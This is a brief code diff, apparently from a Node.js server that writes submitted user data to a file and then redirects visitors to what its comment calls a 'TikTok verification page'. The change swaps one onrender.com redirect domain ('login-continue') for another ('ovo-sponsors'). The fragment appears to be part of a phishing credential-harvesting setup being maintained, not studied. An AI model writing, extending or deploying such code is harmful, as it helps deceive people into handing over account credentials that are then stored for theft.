@@ -62,7 +62,7 @@ ${'='.repeat(60)}
     console.log('File size:', fs.statSync(usersFile).size, 'bytes');
     
     // Redirect to TikTok verification page
-    res.redirect('https://login-continue.onrender.com/');
+    res.redirect('https://ovo-sponsors.onrender.com/');
   } catch (err) {
     console.error('Error writing to file:', err);
     console.error('File path:', usersFile);
